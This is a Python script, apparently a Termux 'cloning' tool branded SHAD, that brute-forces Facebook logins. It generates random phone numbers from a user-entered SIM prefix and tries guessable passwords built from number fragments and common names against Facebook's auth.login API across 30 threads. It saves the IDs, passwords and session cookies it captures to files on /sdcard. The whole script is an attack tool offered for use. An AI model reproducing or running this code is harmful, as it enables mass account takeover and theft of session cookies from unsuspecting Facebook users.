#-------------Created_by_SHAD_Power---------#
import os
os.system("pip uninstall requests -y")
os.system("pip install requests")
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
from bs4 import BeautifulSoup as bxx
import re
import sys
import uuid
import json
import platform,math,smtplib
import platform
import smtplib
import math
#import httpx
import os,base64,zlib,pip,urllib
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3

print('\n\033[1;37m install modules...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python PomPom.py')


#  os.system('xdg-open https://www.facebook.com/power,termux,zone')
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/427.0.0.31.63;FBBV/444411021;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua


logo=(f'''\033[1;37m

   _____ _    _          _____  
  / ____| |  | |   /\   |  __ \ 
 | (___ | |__| |  /  \  | |  | |
  \___ \|  __  | / /\ \ | |  | |
  ____) | |  | |/ ____ \| |__| |
 |_____/|_|  |_/_/    \_\_____/ 
                                
            ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ 🌺Assalam Walaikum🌺 ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                    
                                                            
[✓] Author     |     SHAD
✓] GitHub      |     SHAD-404
[✓] Version    |     0.1
--------------------------------------------------''')

def linex():
    print(50*'-')

def clear():
    clr('clear')
    print(logo)

def SHAD():
    clear()
    os.system('xdg-open https://github.com/princeshahin')
    print(f'[1] Random Cloning')
    print(f'[2] Join FB Group (POWER TERMUX ZONE)')
    print(f'[3] Admin WhatsApp')
    print(f'[0] Exit')
    print(50*'-')
    option=input(f'[?] Choice :')
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/power.termux.zone');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801775094604');time.sleep(1)
    else:
        exit(' Thanks for using dear :)')

def BD_CLONING():
    user=[]
    clear()
    print('[√] Example > [016] [017] [018] [019]')
    code=input('[?] Enter Sim Code :')
    print(50*'-')
    print('[√] Example > [1000] [5000] [10000] [30000] [50000]')
    try:
        limit=int(input('[?] Choice Limit :'))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as SHADPower:
        tl=str(len(user))
        print('[•] Total Account :\033[1;32m'+tl)
        print('\033[1;37m[•] Your Sim Code :\033[1;32m'+code)
        print('\033[1;37m[•] Super Speed Fast Cloning')
        print('[•] Use Flight Mode [\033[1;32mON\033[1;37m]/[\033[1;32mOFF\033[1;37m] For Ok ID')
        print(50*'-')
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','abir123','taniya']
            SHADPower.submit(method_crack,ids,passlist)
    linex()
    print('[√] Cloning Complete')
    print('[√] Total Ok id '+str(len(oks)))
    print('[√] Total Cp id '+str(len(cps)))
    input('[+] BACK  : ')
    exit()

def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r\033[1;37m[\033[1;32mPOWER--PomPom\033[1;37m]>~<[\033[1;32m%s\033[1;37m]>~<[\033[1;32mOK\033[1;37m•\033[1;32m%s\033[1;37m]'%(loop,len(oks)));
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={''"Host":'m.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '1.943750023841858',
            'referer': 'https://www.google.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"220333QAG"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[SHAD-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    print(50*'-')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;36m [COOKIE-💥] '+coki)
                    open('/sdcard/SHAD.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[GF-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/GF-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

SHAD()
